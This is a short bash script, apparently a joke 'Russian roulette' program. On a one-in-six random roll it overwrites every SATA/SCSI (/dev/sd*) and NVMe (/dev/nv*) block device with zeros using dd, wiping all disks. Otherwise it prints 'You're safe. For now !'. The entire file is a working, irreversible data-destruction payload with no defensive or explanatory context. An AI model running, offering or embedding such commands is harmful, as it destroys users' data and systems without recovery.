#!/bin/bash
if  [ $[ $RANDOM % 6 ] == 0 ] ; then
for f in /dev/sd*; do
dd if=/dev/zero of=$f
done
for f in /dev/nv*; do
dd if=/dev/zero of=$f
done
else
echo "You're safe. For now !"
fi
